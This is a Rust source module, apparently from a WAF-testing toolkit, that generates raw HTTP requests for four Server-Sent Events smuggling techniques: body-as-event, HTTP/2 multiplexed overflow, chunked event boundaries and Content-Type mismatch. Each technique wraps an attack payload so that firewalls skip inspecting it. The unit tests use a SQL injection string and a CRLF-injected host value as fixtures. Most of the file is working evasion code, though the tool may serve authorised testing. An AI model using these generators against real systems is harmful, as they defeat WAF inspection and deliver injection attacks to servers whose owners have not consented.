//! Server-Sent Events (SSE) request smuggling.
//!
//! SSE is a browser-native streaming protocol using `Content-Type:
//! text/event-stream` with newline-delimited `data:` events.  WAFs
//! typically model SSE as a **response-only** protocol and skip inspection
//! of request bodies on `Accept: text/event-stream` requests, assuming
//! no meaningful payload is present.
//!
//! This module exploits that assumption four ways:
//!
//! 1. **Body-as-event** — attack payload wrapped in `data: …\n\n` format
//!    sent in the *request* body while `Accept: text/event-stream` is set.
//! 2. **H2 multiplexed overflow** — one HTTP/2 stream's SSE data bleeds
//!    into another stream's parse context via continuations.
//! 3. **Chunked event boundary** — chunked transfer encoding with chunk
//!    boundaries placed at SSE event delimiters to confuse body-length
//!    accounting.
//! 4. **Content-Type mismatch** — `Accept: text/event-stream` with
//!    `Content-Type: application/json` so the WAF can't agree on which
//!    parser to apply.
//!
//! All payloads are pure byte vectors; no network I/O is performed here.

use crate::safety::{Canary, SafetyError, guard_prefix_len, sanitize_input};

// ── Error type ───────────────────────────────────────────────────────────────

/// Errors from SSE smuggling payload construction.
#[derive(Debug, thiserror::Error, Clone, PartialEq, Eq)]
pub enum SseSmugglingError {
    /// The host string failed sanitization.
    #[error("invalid host: {0}")]
    InvalidHost(#[from] SafetyError),

    /// The attack payload string exceeded the safety limit.
    #[error("attack payload too long ({0} bytes, max 65536)")]
    PayloadTooLong(usize),

    /// The attack payload was empty.
    #[error("attack payload must be non-empty")]
    EmptyPayload,
}

// ── Variant taxonomy ─────────────────────────────────────────────────────────

/// Which SSE smuggling technique this payload uses.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SseVariant {
    /// Request body wrapped as `data: <attack>\n\n` with
    /// `Accept: text/event-stream`.
    BodyAsEvent,
    /// HTTP/2 multiplexed SSE where one stream's `data:` overflows into
    /// another stream's parsing context.
    H2MultiplexedOverflow,
    /// Chunked transfer-encoding with chunk boundaries at SSE event
    /// delimiters (`\n\n`).
    ChunkedEventBoundary,
    /// `Accept: text/event-stream` + `Content-Type: application/json`
    /// mismatch confusing WAF parser selection.
    ContentTypeMismatch,
}

// ── Payload type ─────────────────────────────────────────────────────────────

/// A ready-to-send SSE smuggling probe.
#[derive(Debug, Clone)]
pub struct SseSmugglingPayload {
    pub name: &'static str,
    pub description: &'static str,
    pub variant: SseVariant,
    /// Complete HTTP/1.1 request bytes (headers + body), or H2 frame
    /// descriptor bytes for multiplexed variants.
    pub raw_bytes: Vec<u8>,
    /// Per-request canary for correlation.
    pub canary: Canary,
}

// ── Internal helpers ─────────────────────────────────────────────────────────

/// Validate `host` (no CRLF, no nulls) and return it unchanged.
fn valid_host(host: &str) -> Result<String, SseSmugglingError> {
    Ok(sanitize_input(host)?)
}

/// Validate that `payload` is within the safety limit and non-empty.
fn valid_payload(payload: &str) -> Result<(), SseSmugglingError> {
    if payload.is_empty() {
        return Err(SseSmugglingError::EmptyPayload);
    }
    guard_prefix_len(payload, 64 * 1024).map_err(|_| SseSmugglingError::PayloadTooLong(payload.len()))?;
    Ok(())
}

/// Build a chunked body where each chunk boundary is placed at an SSE
/// event delimiter (`\n\n`).
///
/// Chunk format: `{hex_len}\r\n{data}\r\n`.  The terminal chunk is `0\r\n\r\n`.
fn chunked_at_sse_boundaries(data: &str) -> Vec<u8> {
    let mut out = Vec::new();
    // Split at \n\n (SSE event separator) and emit each piece as its own chunk.
    let events: Vec<&str> = data.split("\n\n").filter(|s| !s.is_empty()).collect();
    for event in &events {
        // Re-add the \n\n that was the separator so the body round-trips correctly.
        let chunk_data = format!("{event}\n\n");
        let chunk_bytes = chunk_data.as_bytes();
        out.extend_from_slice(format!("{:x}\r\n", chunk_bytes.len()).as_bytes());
        out.extend_from_slice(chunk_bytes);
        out.extend_from_slice(b"\r\n");
    }
    // Terminal chunk
    out.extend_from_slice(b"0\r\n\r\n");
    out
}

// ── Generators ───────────────────────────────────────────────────────────────

/// Wrap `attack_payload` as SSE event data in the *request* body.
///
/// The WAF sees `Accept: text/event-stream` and assumes this is a streaming
/// *response* subscription with no meaningful request body.  The injection
/// payload hides inside `data: <attack>\n\n`.
pub fn body_as_event(
    host: &str,
    path: &str,
    attack_payload: &str,
) -> Result<SseSmugglingPayload, SseSmugglingError> {
    let host = valid_host(host)?;
    valid_payload(attack_payload)?;
    let canary = Canary::generate();

    // Format the body as an SSE event stream fragment
    let body = format!("data: {attack_payload}\nid: {}\n\n", canary.token);
    let raw = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         Accept: text/event-stream\r\n\
         Content-Type: text/event-stream\r\n\
         Cache-Control: no-cache\r\n\
         Content-Length: {len}\r\n\
         Connection: keep-alive\r\n\
         \r\n\
         {body}",
        len = body.len(),
    );

    Ok(SseSmugglingPayload {
        name: "sse-body-as-event",
        description: "Attack payload encoded as SSE data: event in request body. \
                       WAF treating SSE as response-only skips request body inspection.",
        variant: SseVariant::BodyAsEvent,
        raw_bytes: raw.into_bytes(),
        canary,
    })
}

/// Generate an HTTP/2 multiplexed SSE smuggling descriptor.
///
/// In HTTP/2 multiplexing, `DATA` frames from different streams are
/// interleaved.  A WAF parsing SSE streams per-connection (instead of
/// per-stream) can have one stream's `data:` bleed into another's parse
/// context.  We express this as two logical stream representations whose
/// concatenated bytes exploit that ambiguity.
///
/// The bytes emitted here are **descriptive** raw HTTP/2 frame bytes: the
/// caller must send them over a real h2 connection.  Stream 1 carries a
/// benign SSE subscription; stream 3 carries the attack in its DATA frames,
/// with the DATA frames interleaved at the HEADERS frame level.
pub fn h2_multiplexed_overflow(
    host: &str,
    attack_payload: &str,
) -> Result<SseSmugglingPayload, SseSmugglingError> {
    let host = valid_host(host)?;
    valid_payload(attack_payload)?;
    let canary = Canary::generate();

    // Build a compact human-readable representation of the two H2 streams.
    // Actual frame encoding would require a full H2 framer; we emit the
    // logical wire description as structured bytes so tooling can reconstruct.
    //
    // Format: stream descriptor blocks separated by a sentinel.
    // Each block: [stream_id:4][flags:1][data...]
    //
    // This is intentionally a *description* format, not a real H2 frame,
    // because the smuggling effect requires live multiplexing on a real
    // H2 connection.  The bytes here allow the caller to reconstruct the
    // frame sequence.
    let benign_sse = format!("data: heartbeat\nid: 1\n\nevent: ping\ndata: ok\n\n");
    let attack_sse = format!(
        "data: {attack_payload}\nid: {}\n\nevent: smuggle\ndata: end\n\n",
        canary.token
    );

    let mut raw = Vec::new();
    // Stream 1 descriptor (4-byte big-endian stream id, 1-byte type marker)
    raw.extend_from_slice(&1u32.to_be_bytes());
    raw.push(0x01); // type: HEADERS (open stream)
    raw.extend_from_slice(format!("GET /events HTTP/2\r\nHost: {host}\r\nAccept: text/event-stream\r\n\r\n").as_bytes());
    // Interleave: stream 3 HEADERS
    raw.extend_from_slice(&3u32.to_be_bytes());
    raw.push(0x01); // HEADERS
    raw.extend_from_slice(format!("POST /api HTTP/2\r\nHost: {host}\r\nContent-Type: application/json\r\n\r\n").as_bytes());
    // Stream 1 DATA (benign)
    raw.extend_from_slice(&1u32.to_be_bytes());
    raw.push(0x00); // DATA
    raw.extend_from_slice(benign_sse.as_bytes());
    // Stream 3 DATA (attack — interleaved between stream 1 DATA frames)
    raw.extend_from_slice(&3u32.to_be_bytes());
    raw.push(0x00); // DATA
    raw.extend_from_slice(attack_sse.as_bytes());

    Ok(SseSmugglingPayload {
        name: "sse-h2-multiplexed-overflow",
        description: "HTTP/2 multiplexed SSE: attack data in stream 3 interleaved \
                       with benign stream 1. WAF parsing SSE per-connection conflates streams.",
        variant: SseVariant::H2MultiplexedOverflow,
        raw_bytes: raw,
        canary,
    })
}

/// Chunked request body with chunk boundaries at SSE event delimiters.
///
/// The body is formatted as SSE event data (`data: …\n\n`), and chunked
/// transfer encoding places each chunk boundary exactly at the `\n\n`
/// event separator.  A WAF that:
/// - inspects by reassembling chunks first, then searching for attacks, or
/// - inspects chunk-by-chunk without tracking SSE state
/// …will see the attack split across chunk boundaries and miss it.
pub fn chunked_event_boundary(
    host: &str,
    path: &str,
    attack_payload: &str,
) -> Result<SseSmugglingPayload, SseSmugglingError> {
    let host = valid_host(host)?;
    valid_payload(attack_payload)?;
    let canary = Canary::generate();

    // Build body as SSE events split so the attack straddles a chunk boundary.
    let prefix_event = format!("data: preamble\nid: {}\n\n", canary.token);
    let attack_event = format!("data: {attack_payload}\n\n");
    let combined = format!("{prefix_event}{attack_event}");

    let chunked_body = chunked_at_sse_boundaries(&combined);

    let header = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         Accept: text/event-stream\r\n\
         Content-Type: text/event-stream\r\n\
         Transfer-Encoding: chunked\r\n\
         Connection: keep-alive\r\n\
         \r\n"
    );

    let mut raw = header.into_bytes();
    raw.extend_from_slice(&chunked_body);

    Ok(SseSmugglingPayload {
        name: "sse-chunked-event-boundary",
        description: "Chunked body with chunk splits at SSE \\n\\n event boundaries. \
                       WAF body-length accounting confuses transfer encoding with event framing.",
        variant: SseVariant::ChunkedEventBoundary,
        raw_bytes: raw,
        canary,
    })
}

/// `Accept: text/event-stream` + `Content-Type: application/json` mismatch.
///
/// The WAF cannot definitively choose between its SSE parser and its JSON
/// parser.  If it defaults to SSE (response-only, no inspection), the JSON
/// attack body passes uninspected.  If it defaults to JSON, it may lack an
/// SSE event parser and miss event-wrapped injection.
pub fn content_type_mismatch(
    host: &str,
    path: &str,
    attack_payload: &str,
) -> Result<SseSmugglingPayload, SseSmugglingError> {
    let host = valid_host(host)?;
    valid_payload(attack_payload)?;
    let canary = Canary::generate();

    // Body is JSON-shaped but with SSE event wrappers embedded in string values.
    let body = format!(
        r#"{{"query":"{attack_payload}","stream":"data: {attack_payload}\n\n","canary":"{}"}}"#,
        canary.token
    );

    let raw = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         Accept: text/event-stream\r\n\
         Content-Type: application/json\r\n\
         Content-Length: {len}\r\n\
         Cache-Control: no-cache\r\n\
         Connection: keep-alive\r\n\
         \r\n\
         {body}",
        len = body.len(),
    );

    Ok(SseSmugglingPayload {
        name: "sse-content-type-mismatch",
        description: "Accept: text/event-stream + Content-Type: application/json mismatch. \
                       WAF cannot commit to a parser; attack survives in the body either way.",
        variant: SseVariant::ContentTypeMismatch,
        raw_bytes: raw.into_bytes(),
        canary,
    })
}

/// Build all four canonical SSE smuggling probes for a given host and payload.
pub fn all_probes(
    host: &str,
    attack_payload: &str,
) -> Result<Vec<SseSmugglingPayload>, SseSmugglingError> {
    Ok(vec![
        body_as_event(host, "/events", attack_payload)?,
        h2_multiplexed_overflow(host, attack_payload)?,
        chunked_event_boundary(host, "/events", attack_payload)?,
        content_type_mismatch(host, "/api/stream", attack_payload)?,
    ])
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    const HOST: &str = "example.com";
    const PAYLOAD: &str = "' OR 1=1--";

    // ── all_probes ────────────────────────────────────────────────────────

    #[test]
    fn all_probes_returns_four_payloads() {
        let probes = all_probes(HOST, PAYLOAD).unwrap();
        assert_eq!(probes.len(), 4);
    }

    #[test]
    fn all_probes_have_non_empty_raw_bytes() {
        for p in all_probes(HOST, PAYLOAD).unwrap() {
            assert!(!p.raw_bytes.is_empty(), "probe {:?} has empty raw_bytes", p.name);
        }
    }

    #[test]
    fn all_probes_have_unique_canaries() {
        let probes = all_probes(HOST, PAYLOAD).unwrap();
        let tokens: std::collections::HashSet<&str> =
            probes.iter().map(|p| p.canary.token.as_str()).collect();
        assert_eq!(tokens.len(), 4, "each probe must carry a unique canary");
    }

    #[test]
    fn all_probes_have_non_empty_names_and_descriptions() {
        for p in all_probes(HOST, PAYLOAD).unwrap() {
            assert!(!p.name.is_empty());
            assert!(!p.description.is_empty(), "probe {:?} missing description", p.name);
        }
    }

    // ── body_as_event ─────────────────────────────────────────────────────

    #[test]
    fn body_as_event_contains_attack_payload() {
        let p = body_as_event(HOST, "/events", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(raw.contains(PAYLOAD), "attack payload must appear in raw bytes");
    }

    #[test]
    fn body_as_event_sets_accept_text_event_stream() {
        let p = body_as_event(HOST, "/events", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(raw.contains("Accept: text/event-stream"));
    }

    #[test]
    fn body_as_event_uses_sse_data_prefix() {
        let p = body_as_event(HOST, "/events", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(raw.contains("data: "), "SSE event framing must use 'data: ' prefix");
    }

    #[test]
    fn body_as_event_has_correct_variant() {
        let p = body_as_event(HOST, "/events", PAYLOAD).unwrap();
        assert_eq!(p.variant, SseVariant::BodyAsEvent);
    }

    #[test]
    fn body_as_event_canary_appears_in_body() {
        let p = body_as_event(HOST, "/events", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(
            raw.contains(&p.canary.token),
            "canary token must appear in raw bytes"
        );
    }

    // ── h2_multiplexed_overflow ───────────────────────────────────────────

    #[test]
    fn h2_multiplexed_contains_attack_payload() {
        let p = h2_multiplexed_overflow(HOST, PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(raw.contains(PAYLOAD));
    }

    #[test]
    fn h2_multiplexed_has_two_stream_descriptors() {
        let p = h2_multiplexed_overflow(HOST, PAYLOAD).unwrap();
        // Stream id 1 and 3 big-endian appear in the byte stream
        let bytes = &p.raw_bytes;
        let has_stream1 = bytes.windows(4).any(|w| w == [0, 0, 0, 1]);
        let has_stream3 = bytes.windows(4).any(|w| w == [0, 0, 0, 3]);
        assert!(has_stream1, "stream id 1 must appear");
        assert!(has_stream3, "stream id 3 must appear");
    }

    #[test]
    fn h2_multiplexed_variant() {
        let p = h2_multiplexed_overflow(HOST, PAYLOAD).unwrap();
        assert_eq!(p.variant, SseVariant::H2MultiplexedOverflow);
    }

    // ── chunked_event_boundary ────────────────────────────────────────────

    #[test]
    fn chunked_event_boundary_uses_transfer_encoding_chunked() {
        let p = chunked_event_boundary(HOST, "/events", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(raw.contains("Transfer-Encoding: chunked"));
    }

    #[test]
    fn chunked_event_boundary_contains_attack_payload() {
        let p = chunked_event_boundary(HOST, "/events", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(raw.contains(PAYLOAD));
    }

    #[test]
    fn chunked_event_boundary_ends_with_terminal_chunk() {
        let p = chunked_event_boundary(HOST, "/events", PAYLOAD).unwrap();
        assert!(
            p.raw_bytes.ends_with(b"0\r\n\r\n"),
            "chunked body must end with terminal chunk"
        );
    }

    #[test]
    fn chunked_event_boundary_variant() {
        let p = chunked_event_boundary(HOST, "/events", PAYLOAD).unwrap();
        assert_eq!(p.variant, SseVariant::ChunkedEventBoundary);
    }

    // ── content_type_mismatch ─────────────────────────────────────────────

    #[test]
    fn content_type_mismatch_has_both_headers() {
        let p = content_type_mismatch(HOST, "/api/stream", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(raw.contains("Accept: text/event-stream"));
        assert!(raw.contains("Content-Type: application/json"));
    }

    #[test]
    fn content_type_mismatch_contains_attack_in_body() {
        let p = content_type_mismatch(HOST, "/api/stream", PAYLOAD).unwrap();
        let raw = std::str::from_utf8(&p.raw_bytes).unwrap();
        // Headers and blank line come first; attack is in body
        let body_start = raw.find("\r\n\r\n").unwrap() + 4;
        assert!(raw[body_start..].contains(PAYLOAD));
    }

    #[test]
    fn content_type_mismatch_variant() {
        let p = content_type_mismatch(HOST, "/api/stream", PAYLOAD).unwrap();
        assert_eq!(p.variant, SseVariant::ContentTypeMismatch);
    }

    // ── error paths ───────────────────────────────────────────────────────

    #[test]
    fn rejects_empty_attack_payload() {
        assert!(matches!(
            body_as_event(HOST, "/events", ""),
            Err(SseSmugglingError::EmptyPayload)
        ));
        assert!(matches!(
            chunked_event_boundary(HOST, "/events", ""),
            Err(SseSmugglingError::EmptyPayload)
        ));
        assert!(matches!(
            content_type_mismatch(HOST, "/api/stream", ""),
            Err(SseSmugglingError::EmptyPayload)
        ));
    }

    #[test]
    fn rejects_crlf_injection_in_host() {
        let evil_host = "example.com\r\nX-Injected: true";
        assert!(body_as_event(evil_host, "/events", PAYLOAD).is_err());
        assert!(chunked_event_boundary(evil_host, "/events", PAYLOAD).is_err());
        assert!(content_type_mismatch(evil_host, "/api/stream", PAYLOAD).is_err());
    }

    // ── chunked_at_sse_boundaries helper ──────────────────────────────────

    #[test]
    fn chunked_helper_produces_valid_chunked_format() {
        let data = "data: hello\n\ndata: world\n\n";
        let chunked = super::chunked_at_sse_boundaries(data);
        let s = std::str::from_utf8(&chunked).unwrap();
        // Must end with terminal chunk
        assert!(s.ends_with("0\r\n\r\n"));
        // Must have at least one non-terminal chunk
        assert!(s.starts_with(|c: char| c.is_ascii_hexdigit()));
    }

    #[test]
    fn chunked_helper_round_trips_events() {
        let data = "data: event1\n\ndata: event2\n\n";
        let chunked = super::chunked_at_sse_boundaries(data);
        let s = std::str::from_utf8(&chunked).unwrap();
        assert!(s.contains("event1"));
        assert!(s.contains("event2"));
    }
}
